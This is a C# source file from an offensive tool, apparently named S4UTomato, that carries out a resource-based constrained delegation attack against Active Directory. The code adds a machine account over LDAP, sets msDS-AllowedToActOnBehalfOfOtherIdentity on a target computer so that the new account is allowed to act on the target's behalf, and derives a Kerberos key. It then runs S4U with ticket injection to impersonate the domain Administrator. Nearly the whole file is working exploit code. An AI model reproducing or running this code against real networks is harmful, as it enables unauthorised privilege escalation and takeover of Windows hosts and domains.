using System;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

namespace S4UTomato.Methods
{
    public class Rbcd
    {
        public static string RootDN;
        public static string ComputersDN;
        public static string NewComputersDN;
        public static string TargetComputerDN;

        public static void Execute(string targetComputerName, string domain, string domainController, int port, string computerName, string computerPassword)
        {
            string targetUser = $"{domain}\\Administrator";
            string targetSPN = $"HOST/{targetComputerName}";
            string computerHash = "";
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.rc4_hmac; // throwaway placeholder, changed to something valid

            if (S4UTomato.Program.Verbose)
                Console.WriteLine("[*] Action: AllowedToAct\r\n");

            SecurityIdentifier securityIdentifier = null;
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, port);
            LdapConnection connection = new LdapConnection(identifier);

            if (connection != null)
            {
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                connection.Bind();

                foreach (string DC in domain.Split('.'))
                {
                    RootDN += ",DC=" + DC;
                }

                RootDN = RootDN.TrimStart(',');
                ComputersDN = "CN=Computers," + RootDN;
                NewComputersDN = $"CN={computerName}," + ComputersDN;
                TargetComputerDN = $"CN={targetComputerName}," + ComputersDN;

                // SearchResultEntryCollection Entries = Ldap.GetSearchResultEntries(connection, ComputersDN, "(&(samAccountType=805306369)(|(name=" + computerName + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
                DirectoryEntry entry = Ldap.LocateAccount(computerName + "$", domain, domainController);
                if (entry != null)
                {
                    Console.WriteLine("[*] The computer account already exists.");
                    try
                    {
                        securityIdentifier = new SecurityIdentifier(entry.Properties["objectSid"][0] as byte[], 0);
                        Console.WriteLine($"[*] Sid of the new computer account: {securityIdentifier.Value}");
                    }
                    catch
                    {
                        Console.WriteLine("[-] Can not retrieve the sid");
                    }
                }
                else
                {
                    AddRequest addRequest = new AddRequest(NewComputersDN, new DirectoryAttribute[] {
                        new DirectoryAttribute("DnsHostName", computerName + "." + domain),
                        new DirectoryAttribute("SamAccountName", computerName + "$"),
                        new DirectoryAttribute("userAccountControl", "4096"),
                        new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + computerPassword + "\"")),
                        new DirectoryAttribute("objectClass", "Computer"),
                        new DirectoryAttribute("ServicePrincipalName", "HOST/" + computerName + "." + domain, "RestrictedKrbHost/" + computerName + "." + domain, "HOST/" + computerName, "RestrictedKrbHost/" + computerName)
                    });

                    try
                    {
                        connection.SendRequest(addRequest);
                        Console.WriteLine($"[*] Computer account {computerName}$ added with password {computerPassword}.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] The new computer could not be created! User may have reached ms-DS-ComputerAccountQuota limit");
                    }

                    // Get SID of the new computer object
                    // Entries = Ldap.GetSearchResultEntries(connection, NewComputersDN, "(&(samAccountType=805306369)(|(name=" + computerName + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
                    entry = Ldap.LocateAccount(computerName + "$", domain, domainController);
                    if (entry != null)
                    {
                        try
                        {
                            securityIdentifier = new SecurityIdentifier(entry.Properties["objectSid"][0] as byte[], 0);
                            Console.WriteLine($"[*] Sid of the new computer account: {securityIdentifier.Value}");
                        }
                        catch
                        {
                            Console.WriteLine("[-] Can not retrieve the sid");
                        }
                    }
                }

                string nTSecurityDescriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + securityIdentifier + ")";
                RawSecurityDescriptor rawSecurityIdentifier = new RawSecurityDescriptor(nTSecurityDescriptor);
                byte[] descriptorBuffer = new byte[rawSecurityIdentifier.BinaryLength];
                rawSecurityIdentifier.GetBinaryForm(descriptorBuffer, 0);

                ModifyRequest modifyRequest = new ModifyRequest(TargetComputerDN, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptorBuffer);
                try
                {
                    ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
                    Console.WriteLine($"[*] {computerName}$ can now impersonate users on {TargetComputerDN} via S4U2Proxy");
                    if (S4UTomato.Program.Verbose)
                        Console.WriteLine();
                }
                catch
                {
                    Console.WriteLine("[-] Could not modify attribute msDS-AllowedToActOnBehalfOfOtherIdentity, check that your user has sufficient rights");
                }

            }

            if (!String.IsNullOrEmpty(computerPassword))
            {
                //string salt = String.Format("{0}{1}", domain.ToUpper(), computerName);
                string salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), computerName.TrimEnd('$').ToLower(), domain.ToLower());
                computerHash = Crypto.KerberosPasswordHash(encType, computerPassword, salt);
            }

            if (S4UTomato.Program.Verbose)
                Console.WriteLine("[*] Action: S4U\r\n");
            S4U.Execute(computerName, domain, computerHash, encType, targetUser, targetSPN, ptt: true, domainController: domainController);
        }
            
    }
}
